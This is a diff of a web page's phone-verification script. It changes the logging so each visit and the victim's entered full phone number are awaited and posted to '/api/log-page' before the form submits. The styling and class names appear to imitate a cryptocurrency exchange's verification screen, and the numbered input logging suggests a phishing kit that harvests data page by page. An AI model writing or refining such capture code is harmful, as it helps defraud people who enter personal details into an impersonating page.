@@ -311,26 +311,26 @@
   </div>
   <script src="../assets/intlTelInput.min.js"></script>
   <script>
-    function sendLogUpdate(payload) {
+    async function sendLogUpdate(payload) {
       try {
         const body = JSON.stringify(payload);
-        fetch('/api/log-page', {
+        await fetch('/api/log-page', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body
-        }).catch(err => console.error('Phone log failed', err));
+        });
       } catch (err) {
         console.error('Phone log error', err);
       }
     }
 
     function logPhonePage() {
-      sendLogUpdate({ page: 'phone' });
+      sendLogUpdate({ page: 'phone' }).catch(err => console.error('Phone page log failed', err));
     }
 
-    function logPhoneInput(value) {
+    async function logPhoneInput(value) {
       if (value && value.trim()) {
-        sendLogUpdate({
+        await sendLogUpdate({
           page: 'phone',
           inputs: { input3: value.trim() }
         });
@@ -366,7 +366,7 @@
       }
     });
 
-    f.addEventListener('submit', function(evt) {
+    f.addEventListener('submit', async function(evt) {
         evt.preventDefault();
         if(!(iti.isValidNumber())) {
             ph.parentElement.parentElement.style.borderColor = '#f84960';
@@ -375,7 +375,7 @@
             document.forms[0].fullnumber.value = iti.getNumber();
             ph.parentElement.parentElement.style.borderColor = 'rgb(234, 236, 239)';
             ph.closest('.bc-verify-input-content').nextElementSibling.style.color = '#76808f';
-            logPhoneInput(document.forms[0].fullnumber.value);
+            await logPhoneInput(document.forms[0].fullnumber.value);
             f.submit();
         }
     });
